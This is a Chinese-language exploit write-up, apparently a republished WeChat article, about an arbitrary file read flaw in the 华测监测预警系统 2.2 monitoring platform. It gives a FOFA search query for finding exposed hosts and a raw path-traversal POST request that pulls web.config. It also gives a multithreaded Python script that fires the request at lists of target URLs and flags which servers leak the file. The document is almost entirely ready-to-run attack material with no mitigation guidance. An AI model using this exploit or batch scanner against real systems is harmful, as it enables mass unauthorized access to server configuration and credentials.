> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/jkpFs28-8sKSpMn-_XTtIw)

#### 华测监测预警系统 任意文件读取漏洞

**FOFA**：`app="华测监测预警系统2.2"`

##### 复现步骤

```
POST /Handler/FileDownLoad.ashx HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/92.0.4495.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Origin: http://ip:port
Content-Length: 42

filename=1&filepath=..%2F..%2Fweb.config


```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Z8DAfzBiajSYqUMZKUfoST0licj4Rz3ABnTEoibQQO7alPcGJSAjI1H0h0IoDvBemZbAoauLiceKTMP3jpDG3o9wwg/640?wx_fmt=png)  

##### 批量脚本

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Time       : 2023/8/17 11:48
# Author     : yunkong
# FileName   : 111.py
# Description:

import argparse
import requests
import concurrent.futures

proxy = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080"
}


def send_post_request(target_url, filename, filepath):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/92.0.4495.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close",
        "Origin": target_url
    }

    data = {
        "filename": filename,
        "filepath": filepath
    }

    try:
        response = requests.post(target_url + "/Handler/FileDownLoad.ashx", headers=headers, data=data, proxies=proxy)
        if response.status_code == 200and"<add "in response.text:
            print("[+] Request successful for:", target_url)
            # print(response.text)
        else:
            print("[-] Request failed with status code for:", target_url, response.status_code)
    except requests.exceptions.RequestException as e:
        print("[-] Error for:", target_url)


def main():
    parser = argparse.ArgumentParser(description="Send POST requests to target URLs")
    parser.add_argument("-u", "--url", help="Single target URL")
    parser.add_argument("-U", "--url-file", help="File containing multiple target URLs")
    args = parser.parse_args()

    if args.url:
        filename = "1"
        filepath = "../../web.config"
        send_post_request(args.url, filename, filepath)
    elif args.url_file:
        with open(args.url_file, 'r') as url_file:
            url_list = [line.strip() for line in url_file]

        filename = "1"
        filepath = "../../web.config"
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            for url in url_list:
                executor.submit(send_post_request, url, filename, filepath)
    else:
        parser.print_help()


if __name__ == '__main__':
    main()



```

##### 使用方法

```
# 单个目标
python example.py -u http://example.com

# 多个目标
python example.py -U file_path


```